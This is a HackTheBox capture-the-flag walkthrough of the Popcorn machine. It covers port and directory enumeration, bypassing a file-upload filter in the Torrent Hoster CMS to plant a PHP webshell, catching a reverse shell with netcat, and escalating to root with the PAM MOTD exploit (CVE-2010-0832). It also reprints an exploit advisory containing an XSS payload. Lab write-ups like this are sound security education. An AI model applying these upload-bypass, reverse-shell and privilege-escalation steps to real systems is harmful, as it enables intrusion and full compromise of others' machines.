---
title: "Walk-through of Popcorn from HackTheBox"
header:
  teaser: /assets/images/xx.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - 
  - 
  - 
  - 
---

## Machine Information

![popcorn](/assets/images/2020-05-14-20-35-43.png)

Popcorn contains a lot of content making it difficult to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation. Skills required are basic knowledge of Linux and enumerating ports and services. Skills learned are bypassing file upload checks and modifying HTTP requests.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 004 - Medium - Popcorn](https://www.hackthebox.eu/home/machines/profile/4) |
| Machine Release Date | 15th March 2017 |
| Date I Completed It | 21st October 2019 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

## Method using CMS Exploit

### Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/popcorn# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.6 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/popcorn# nmap -p$ports -v -sC -sV -oA popcorn 10.10.10.6

Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-21 21:02 BST
Nmap scan report for 10.10.10.6
Host is up (0.023s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
NSE: Script Post-scanning.
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
Initiating NSE at 21:02
Completed NSE at 21:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Only two ports open, have a look at port 80 first:

![website](/assets/images/2020-05-14-20-46-02.png)

Nothing there, time to brute force for hidden folders:

```text
root@kali:~/htb/popcorn# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.10.6
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.6
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2019/10/21 21:09:25 Starting gobuster
===============================================================
http://10.10.10.6/test (Status: 200)
http://10.10.10.6/index (Status: 200)
http://10.10.10.6/torrent (Status: 301)
http://10.10.10.6/rename (Status: 301)
===============================================================
2019/10/21 21:11:06 Finished
===============================================================
```

Have a look at test first:

![test](/assets/images/2020-05-14-20-50-16.png)

This is just the standard phpinfo page, but does show it has Suhosin installed, which protects against some attack methods. More info [here](https://suhosin.org/stories/index.html).

Torrent sounds interesting, go have a look in browser:

![torrent](/assets/images/2020-05-14-20-52-39.png)

This is a really old opensource torrent cms from 2007, must be exploitable:

```text
root@kali:~/htb# searchsploit torrent hoster
---------------------------------- ----------------------------------------
 Exploit Title                    |  Path
                                  | (/usr/share/exploitdb/)
---------------------------------- ----------------------------------------
Torrent Hoster - Remount Upload   | exploits/php/webapps/11746.txt
---------------------------------- ----------------------------------------

root@kali:~/htb# searchsploit -m exploits/php/webapps/11746.txt
  Exploit: Torrent Hoster - Remount Upload
      URL: https://www.exploit-db.com/exploits/11746
     Path: /usr/share/exploitdb/exploits/php/webapps/11746.txt
File Type: HTML document, ASCII text, with CRLF line terminators
Copied to: /root/htb/11746.txt

root@kali:~/htb# cat 11746.txt
========================================================================================
| # Title    : Torrent Hoster Remont Upload Exploit
| # Author   : El-Kahina
| # Home     : www.h4kz.com
| # Script   : Powered by Torrent Hoster.     
| # Tested on: Windows SP2 Francais V.(Pnx2 2.0) + Lunix Francais v.(9.4 Ubuntu)
| # Bug      : Upload
======================      Exploit By El-Kahina       =================================
 # Exploit  :
 1 - use tamper data : http://127.0.0.1/torrenthoster//torrents.php?mode=upload
 2 - <center>
        Powered by Torrent Hoster
        <br />
        <form enctype="multipart/form-data" action="http://127.0.0.1/torrenthoster/upload.php" id="form" method="post" onsubmit="a=document.getElementById('form').style;a.display='none';b=document.getElementById('part2').style;b.display='inline';" style="display: inline;">
        <strong>&#65533;&#65533;&#65533;&#65533; &#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533; &#65533;&#65533; &#65533;&#65533;:</strong> <?php echo $maxfilesize; ?>&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;<br />
        <br>
        <input type="file" name="upfile" size="50" /><br />
        <input type="submit" value="&#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533;" id="upload" />
        </form>
        <div id="part2" style="display: none;">&#65533;&#65533;&#65533; &#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533; .. &#65533;&#65533; &#65533;&#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533;</div>
     </center>
3 - http://127.0.0.1/torrenthoster/torrents/  (to find shell)
4 - Xss: http://127.0.0.1/torrenthoster/users/forgot_password.php/>"><ScRiPt>alert(00213771818860)</ScRiPt>
==========================================
Greetz : Exploit-db Team
all my friend :(Dz-Ghost Team )
im indoushka's sister
------------------------------------------
```

### Gaining Access

So upload section for torrents is vulnerable to file upload, need to register with site first:

![register](/assets/images/2020-05-14-21-05-24.png)

Now upload a torrent:

![upload](/assets/images/2020-05-14-21-06-55.png)

Can now edit the uploaded torrent:

![edit](/assets/images/2020-05-14-21-08-16.png)

On edit page upload a php script with double extension to get past the file check:

![upload](/assets/images/2020-05-14-21-09-13.png)

Intercept upload in Burp, need to change the content-type to get past second filter:

![burp](/assets/images/2020-05-14-21-10-42.png)

Change to image/jpg and submit, can see the file uploaded successfully:

![change](/assets/images/2020-05-14-21-11-40.png)

Back on torrent page, can now see link to uploaded file:

![link](/assets/images/2020-05-14-21-12-30.png)

Browse to file and use PHP GET in it to execute commands. First check it works:

![execute](/assets/images/2020-05-14-21-13-29.png)

Now open a terminal and start nc listening:

```text
root@kali:~/htb/machines/popcorn# nc -nlvp 4444
listening on [any] 4444 ...
```

Now try to get a reverse shell:

![shell](/assets/images/2020-05-14-21-14-14.png)

Back at terminal we have a connection:

```text
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.6] 41532
python -c 'import pty;pty.spawn("/bin/bash")'       <-- upgrade shell to fully interactive
www-data@popcorn:/var/www/torrent/upload$ ^Z        <-- this is me pressing ctrl-z
[1]+  Stopped                 nc -nlvp 4444
root@kali:~/htb/machines/popcorn# stty raw -echo    <-- type this to give up/down command history, tab complete
root@kali:~/htb/machines/popcorn#  fg               <- this will bring shell back to foreground.
www-data@popcorn:/var/www/torrent/upload$ export TERM=xterm   <-- allows clear etc to work

www-data@popcorn:/var/www/torrent/upload$ whoami
www-data
```

### User and Root Flags

So on as www-data, can get user flag then need to priv esc:

```text
www-data@popcorn:/var/www/torrent/upload$ cat /home/george/user.txt
```

Looking closer at george home folder we see a non default file in the hidden .cache subfolder:

```text
www-data@popcorn:/home/george$ ls -lsaR
  4 -rw------- 1 root   root     2769 May  5  2017 .bash_history
  4 -rw-r--r-- 1 george george    220 Mar 17  2017 .bash_logout
  4 -rw-r--r-- 1 george george   3180 Mar 17  2017 .bashrc
  4 drwxr-xr-x 2 george george   4096 Mar 17  2017 .cache
  4 -rw------- 1 root   root     1571 Mar 17  2017 .mysql_history
  4 -rw------- 1 root   root       19 May  5  2017 .nano_history
  4 -rw-r--r-- 1 george george    675 Mar 17  2017 .profile
  0 -rw-r--r-- 1 george george      0 Mar 17  2017 .sudo_as_admin_successful
832 -rw-r--r-- 1 george george 848727 Mar 17  2017 torrenthoster.zip
  4 -rw-r--r-- 1 george george     33 Mar 17  2017 user.txt

./.cache:
total 8
4 drwxr-xr-x 2 george george 4096 Mar 17  2017 .
4 drwxr-xr-x 3 george george 4096 Mar 17  2017 ..
0 -rw-r--r-- 1 george george    0 Mar 17  2017 motd.legal-displayed

A quick Google of "motd.legal-displayed exploit" finds [this](https://www.exploit-db.com/exploits/14339). Gives a script to exploit PAM 1.1.0 which is used here for the MOTD:

```text
Exploit Title: Ubuntu PAM MOTD local root
# Date: July 9, 2010
# Author: Anonymous
# Software Link: http://packages.ubuntu.com/
# Version: pam-1.1.0
# Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)
# CVE: CVE-2010-0832
# Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i
# References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen
#
# Local root by adding temporary user toor:toor with id 0 to /etc/passwd & /etc/shadow.
# Does not prompt for login by creating temporary SSH key and authorized_keys entry.
```

Looks good so save to file on box and run:

```text
www-data@popcorn:/tmp$ bash /tmp/pam_exploit.sh

[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: <-- enter toor here
```

Can now ssh on to box as root to get the flag:

```text
root@popcorn:/tmp# cat /root/root.txt
```
